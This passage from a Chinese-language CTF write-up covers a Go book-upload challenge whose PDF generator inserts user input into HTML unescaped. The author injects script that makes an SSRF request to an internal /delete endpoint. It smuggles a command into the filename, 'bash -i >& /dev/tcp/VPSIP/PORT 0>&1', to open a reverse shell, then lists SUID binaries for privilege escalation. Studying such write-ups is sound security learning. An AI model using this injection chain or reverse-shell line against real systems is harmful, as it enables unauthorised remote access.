            return
        }
        makepdf(book.Title, book.Author, book.Description, filename)
        db_table := Conn.DB("ctf").C("books")
        err = db_table.Insert(&book)
        if err != nil {
            c.String(http.StatusBadRequest, fmt.Sprintf("Signup err: %s", err.Error()))
            return
        }
        c.Header("Content-Type", "text/html; charset=utf-8")
        c.String(200, "alert('Book uploaded successfully');window.location.href='/submit'")
    }
`makepdf` 函数里直接将输入的东西拼接进 html 里了，然后生成 pdf，于是想到在这里构造 XSS 来进行 SSRF。
    func makepdf(title, author, description, covers string) string {
        // Create new PDF generator
        pdfg, err := wkhtmltopdf.NewPDFGenerator()
        if err != nil {
            fmt.Println(err)
        }
        template := "" +
                    "" +
                    "" +
                    "" +
                    "" +
                    "Library" +
                    "" +
                    "" +
                    "" + 
                    "Book description" +
                    "" +
                    "" +
                    "Book Title" +
                    "" + title + "" +
                    "" +
                    "" +
                    "Author" +
                    "" + author + "" +
                    "" +
                    "" +
                    " Content Abstract " +
                    "" + description + "" +
                    "" +
                    "" +
                    "" +
                    "" +
                    "" +
                    ""
        pdfg.AddPage(wkhtmltopdf.NewPageReader(strings.NewReader(template)))
        err = pdfg.Create()
        if err != nil {
            fmt.Println(err)
        }
构造 description 如下，反弹个 shell 回来。
（安全客的 waf 又把 `script` 给拦了，手动把下面的 `gcript` 改成 `script` 吧
    var s=new XMLHttpRequest;s.open("POST","http://127.0.0.1:8888/delete");
    s.setRequestHeader('Content-type', 'application/json');s.send('{"filename":"test.pdf|bash -i >& /dev/tcp/VPSIP/PORT 0>&1"}');
VPS 上接收到反弹的 shell
发现 flag 在 `/flagggisshere` 但是没权限读，找找能不能借助 suid 权限来读。
    $ find / -perm -u=s -type f 2>/dev/null
    /usr/lib/xorg/Xorg.wrap
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/sbin/pppd
    /usr/bin/chsh
    /usr/bin/mount
    /usr/bin/chfn
    /usr/bin/comm
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/bin/su
    /usr/bin/gpasswd
    /usr/bin/umount
    /usr/bin/pkexec